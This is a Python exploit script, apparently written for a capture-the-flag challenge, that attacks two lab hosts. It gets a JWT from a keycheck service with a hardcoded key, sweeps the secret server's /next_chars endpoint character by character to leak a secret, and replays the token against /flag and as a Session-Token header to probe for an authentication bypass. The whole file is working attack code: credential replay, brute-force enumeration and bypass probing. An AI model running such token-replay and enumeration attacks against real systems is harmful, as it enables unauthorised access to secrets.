#!/usr/bin/env python3
import string, requests

SECRET = "77.204.214.64"
MAGIC = "magic-key.hkn"
KEY = "C%{6bSUAs52sI@$K8Ouk0"

# 1) Get a FRESH real (unforged) JWT from magic-key's keycheck right now
print("[1] Submitting key to magic-key.hkn/keycheck for a fresh real JWT...")
r = requests.post(f"http://{MAGIC}/keycheck", headers={"Content-Type": "text/plain"},
                   data=f"key={KEY}", timeout=5)
real_jwt = r.headers.get("JWT")
print(f"    Status: {r.status_code}, JWT header: {real_jwt}")
print(f"    Body message line: {[l for l in r.text.splitlines() if 'message' in l.lower()]}")

if not real_jwt:
    print("No JWT header received, aborting.")
    raise SystemExit

# 2) Use this REAL (not forged) JWT against secret-server's /next_chars, sweep all chars
print("\n[2] Sweeping secret-server /next_chars with the REAL (unforged) JWT...")
frag_map = {}
for c in string.printable:
    if c in "\n\r\t\x0b\x0c":
        continue
    try:
        resp = requests.get(f"http://{SECRET}/next_chars", params={"char": c},
                             headers={"JWT": real_jwt}, timeout=4)
        body = resp.text.strip()
        if resp.status_code == 200 and body not in ("[]", ""):
            frag_map[c] = body
    except requests.exceptions.RequestException:
        pass

print(f"    Non-empty responses: {len(frag_map)}")
for c, body in frag_map.items():
    print(f"    {c!r} -> {body}")

# 3) Also try the real JWT against magic-key.hkn's own /next_chars and /flag
print("\n[3] Real JWT against magic-key.hkn directly ###")
for path, params in [("/flag", None), ("/next_chars", {"char": "s"})]:
    resp = requests.get(f"http://{MAGIC}{path}", params=params, headers={"JWT": real_jwt}, timeout=5)
    print(f"  {path} -> {resp.status_code}: {resp.text.strip()[:200]}")

# 4) Try the real JWT AS the Session-Token value itself (plain, exactly as received)
print("\n[4] Real JWT used AS Session-Token value ###")
for path, params in [("/flag", None), ("/next_chars", {"char": "s"})]:
    for extra in ({}, {"URL-Maybe": "/flag"}, {"URL": "/flag"}):
        headers = {"Session-Token": real_jwt, **extra}
        resp = requests.get(f"http://{MAGIC}{path}", params=params, headers=headers, timeout=5)
        if resp.status_code != 401:
            print(f"!!! HIT path={path} extra={extra} -> {resp.status_code}: {resp.text[:300]}")
        else:
            print(f"  path={path} extra={extra} -> 401")
